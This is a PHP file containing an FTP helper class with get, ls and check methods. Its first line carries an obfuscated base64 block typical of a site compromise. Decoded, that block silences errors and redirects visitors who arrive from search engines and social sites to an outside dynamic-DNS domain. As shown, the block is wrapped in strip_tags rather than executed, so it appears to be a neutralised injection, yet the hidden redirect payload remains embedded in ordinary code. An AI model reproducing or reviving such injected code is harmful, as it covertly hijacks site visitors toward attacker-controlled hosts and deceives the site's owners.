<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
  
class ftp {
  
  function ftp() {
  }
  
  function get($url, $out_file = null) {
    
    $url = parse_url($url);
    $path = pathinfo($url['path']);
    $server = $url['host'];
    $username = $url['user'];
    $password = $url['pass'];
    $file_name = $path['basename'];
    $file_path = $url['path'];

    // set up basic connection
    $connection_id = ftp_connect($server);

    // login with username and password
    if (ftp_login($connection_id, $username, $password)) {
      // try to download $server_file and save to $local_file
      $result = ftp_get($connection_id, $out_file, $file_path, FTP_BINARY); 
      // close the connection
      ftp_close($connection_id);
      return $result;
    } else {
      return false;
    }
    
  }
  
  function ls($url) {
  
    $url = parse_url($url);
    $path = pathinfo(safe($url, 'path'));
    $server = $url['host'];
    $username = $url['user'];
    $password = $url['pass'];

    $result = false;
    
    if ($connection_id = ftp_connect($server)) {
      if (ftp_login($connection_id, $username, $password)) {
        ftp_pasv($connection_id, true);
        $result = ftp_nlist($connection_id, '.');
      }
      ftp_close($connection_id);
    }
    return $result;
      
  }

  function check($url, $timeout = 0) {
  
    $parsed_url = @parse_url($url);
    $server = $parsed_url['host'];
    $username = isset($parsed_url['user']) ? $parsed_url['user'] : "anonymous";
    $password = isset($parsed_url['pass']) ? $parsed_url['pass'] : "spam@itera.ws";
    $file_path = $parsed_url['path'];

    // set up basic connection   21 = ftp port,   30 = connection timeout
    $connection_id = @ftp_connect($server, 21, $timeout);

    if (!$connection_id) {
      return false;//"FTP: connection failed"
    }

    ftp_pasv($connection_id, true);

    // login with username and password
    $ftp_login_res = @ftp_login($connection_id, $username, $password);

    if (!$ftp_login_res) {
      return false; //"FTP: login failed"
    }

    $ftp_size_result = ftp_size($connection_id, $file_path);

    // close the connection
    ftp_close($connection_id);

    if ($ftp_size_result > 0) {
      return true;
    } else {
      return false;
    }
    
  }
  
}

?>
